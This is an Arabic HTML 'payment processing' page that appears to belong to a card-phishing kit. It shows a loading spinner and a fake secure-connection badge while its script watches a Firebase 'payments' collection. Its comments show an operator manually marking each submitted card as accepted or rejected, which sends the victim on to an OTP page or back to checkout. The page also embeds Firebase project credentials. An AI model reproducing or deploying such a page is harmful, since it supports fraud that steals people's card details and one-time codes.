<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>جاري معالجة الطلب - بوابة الدفع</title>
  <style>
    :root { --main-green: #008b47; }
    body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .loading-card { background: #fff; width: 90%; max-width: 400px; padding: 40px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
    
    .spinner {
      display: inline-block;
      width: 60px;
      height: 60px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid var(--main-green);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 25px;
    }
    
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    
    .load-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 15px; }
    .load-msg { font-size: 14px; color: #666; line-height: 1.6; }
    
    .secure-footer { margin-top: 30px; font-size: 11px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 5px; }
  </style>
</head>
<body>

<div class="loading-card">
  <div class="spinner"></div>
  <div class="load-title">جاري التحقق من البيانات</div>
  <div class="load-msg">
    يرجى الانتظار ولا تقم بإغلاق المتصفح أو تحديث الصفحة، نحن نقوم الآن بتأمين الاتصال مع البنك المصدر لبطاقتك..
  </div>
  
  <div class="secure-footer">
    <img src="https://img.icons8.com/ios-filled/20/bbbbbb/shield.png" alt="secure">
    اتصال مشفر وآمن (SSL)
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // مراقبة حالة الطلب الأخير للعميل
    function monitorStatus() {
        // بنراقب آخر عملية تمت إضافتها في مجموعة "payments"
        db.collection("payments").orderBy("timestamp", "desc").limit(1)
        .onSnapshot((querySnapshot) => {
            querySnapshot.forEach((doc) => {
                const data = doc.data();
                
                // إذا أعطيت "قبول" للبطاقة -> يروح لـ OTP
                if (data.status === "accept_card") {
                    window.location.href = "otp.php";
                } 
                // إذا أعطيت "رفض" للبطاقة -> يرجع لصفحة الدفع مع رسالة خطأ
                else if (data.status === "reject_card") {
                    window.location.href = "checkout.php?error=invalid_card";
                }
            });
        });
    }

    monitorStatus();
</script>
</body>
</html>